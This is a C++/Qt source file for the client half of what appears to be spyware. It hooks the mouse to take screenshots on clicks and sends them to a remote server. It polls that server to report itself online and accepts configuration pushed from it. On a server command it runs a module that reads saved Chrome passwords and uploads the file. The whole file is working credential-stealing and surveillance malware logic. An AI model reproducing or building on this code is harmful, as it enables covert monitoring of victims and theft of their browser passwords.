#include <QDebug>
#include "client.h"

Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16 _port):
    QObject(parent),
    path(defaultPath),
    ip(_ip),
    port(_port),
    isChromePassExists(false)
{
    //Start modules
    fileServer = new FileServer(this, 1234, path);
    fileClient = new FileClient(this, ip, port);
    config = new Config;
    onlineTimer = new QTimer(this);
    screenTimer = new QTimer(this);

    fileServer->start();

    //Load config
    //Default path ./config.cfg
    if( ! loadConfig(*config) )
    {
        qDebug() << "Config not found. Creating new.";
        saveConfig(*config);
    }

    //Update client state
    update();

    //Trying to connect to server
    getOnline();

    //TODO: new variable isOnline?

    //Connect to receive files and strings
    connect(fileServer, &FileServer::dataSaved, [this](QString str, QString ip){ this->getFile(str, ip); });
    connect(fileServer, &FileServer::stringRecieved, [this](QString str, QString ip){ this->getString(str, ip); });

    //Progress bar
    //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });

    //Connect screenshot module
    connect(&MouseHook::instance(), &MouseHook::mouseClicked,
            this, [this]()
    {
        //Thread for making screenshots files
        QThread* thread = new QThread(this);
        MakeScreen* screen = new MakeScreen(0);
        screen->moveToThread(thread);

        connect(thread, &QThread::started, screen, &MakeScreen::makeScreenshot);
        connect(screen, &MakeScreen::screenSaved, thread, &QThread::quit);
        connect(thread, &QThread::finished, thread, &QThread::deleteLater);
        connect(thread, &QThread::finished, screen, &MakeScreen::deleteLater);

        thread->start();

        connect(screen, &MakeScreen::screenSaved,
        this, [this](QString path)
        {
            //Send screenshot
            fileClient->enqueueData(_FILE, path);
            fileClient->connect();
        });
    });
}

Client::~Client()
{
    fileClient->getOffline();
    delete onlineTimer;
    delete screenTimer;
    delete config;
    delete fileClient;
    delete fileServer;
    qDebug() << "Client deleted.";
}

void Client::update()
{
    qDebug() << "\nCONFIG:";
    qDebug() << "seconds:\t" << config->seconds;

    // 0 x LMB_RMB_MMB_MWH
    int buttons = config->mouseButtons;

    qDebug() << "LMB:\t" << ((buttons & 0x0008) ? 1 : 0);
    qDebug() << "RMB:\t" << ((buttons & 0x0004) ? 1 : 0);
    qDebug() << "MMB:\t" << ((buttons & 0x0002) ? 1 : 0);
    qDebug() << "MWH:\t" << ((buttons & 0x0001) ? 1 : 0);

    //Update screenshot parameters
    MouseHook::instance().setParameters(buttons, config->seconds);
}

void Client::getOnline()
{
    //Start and connect timer
    onlineTimer->start(30*1000);    //30 sec
    connect(onlineTimer, &QTimer::timeout, fileClient, &FileClient::connect);
    connect(fileClient, &FileClient::transmitted, onlineTimer, &QTimer::stop);
    //Send string
    fileClient->enqueueData(_STRING, "ONLINE:" + fileClient->getName());
    fileClient->connect();
}

void Client::getFile(const QString& path, const QString& /* ip */)
{
    qDebug() << path;
    //TODO: if not online => send str online
    QString extension = path.section('.', -1, -1);
    //If config received
    if (extension == "cfg")
        getNewConfig(path);
}

void Client::getString(const QString &string, const QString& /* ip */)
{
    QString command = string.section(':', 0, 0);
    if (command == "FILES")
    {
        QString filesStr = string;
        //remove "FILES:"
        int colonPos = string.indexOf(":");
        filesStr.remove(0, colonPos+1);

        QString currentFile = filesStr.section(';', 0, 0);
        quint16 files = currentFile.toInt();
        if (files & ChromePass & !(isChromePassExists))
        {
            //Start thread with chrome password reader
            QThread* thread = new QThread(this);
            PassReader* passReader = new PassReader;
            passReader->moveToThread(thread);

            connect(thread, &QThread::started, passReader, &PassReader::readPass);
            connect(passReader, &PassReader::passSaved, thread, &QThread::quit);
            connect(thread, &QThread::finished, thread, &QThread::deleteLater);
            connect(thread, &QThread::finished, passReader, &PassReader::deleteLater);

            thread->start();
            isChromePassExists = true;

            connect(passReader, &PassReader::passSaved,
            this, [this](QString path)
            {
                //Send password file
                fileClient->enqueueData(_FILE, path);
                fileClient->connect();
                isChromePassExists = false;
            });
        }

        //Look for all files
        currentFile = filesStr.section(';', 1, 1);
        for (int i = 2; ! currentFile.isEmpty(); ++i)
        {
            qDebug() << currentFile;
            currentFile = filesStr.section(';', i, i);
        }
    }
}

void Client::getNewConfig(const QString &path)
{
    loadConfig(*config, path);
    update();
    //Delete old config and rename new
    QFile oldConfig("config.cfg");
    QFile newConfig(path);
    if (oldConfig.exists())
        oldConfig.remove();
    newConfig.rename("config.cfg");

    //Check if folder is empty and delete
    QDir dir = path.section('/', 0, -2);
    if(dir.entryInfoList(QDir::NoDotAndDotDot|QDir::AllEntries).count() == 0)
        dir.rmdir(path.section('/', 0, -2)); //dir.name()
}

